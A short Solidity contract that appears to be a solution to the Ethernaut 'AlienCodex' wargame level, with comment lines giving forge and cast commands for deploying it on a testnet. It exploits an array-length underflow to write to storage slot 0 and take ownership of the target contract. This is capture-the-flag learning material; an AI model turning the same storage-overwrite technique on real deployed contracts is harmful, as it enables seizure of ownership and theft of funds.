//SPDX-License-Identifier: UNLICENSED
// forge create AlienHack --private-key $ETHERNAUGHT_PRIVATE_KEY --rpc-url $GORELI_OPTIMISIM_RPC
// cast send 0x109a48E009596B9c8b13f1416dB7bfa08448f755 "exploit()" --private-key $ETHERNAUGHT_PRIVATE_KEY --rpc-url $GORELI_OPTIMISIM_RPC

pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AlienHack {
    AlienCodex codex = AlienCodex(0xbe3dD1efd8bB2c60b94833E8F249C4639f2C76D0);

    function exploit () external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
 
        codex.make_contact();
        codex.retract();
        codex.revise(index, myAddress);
    }
}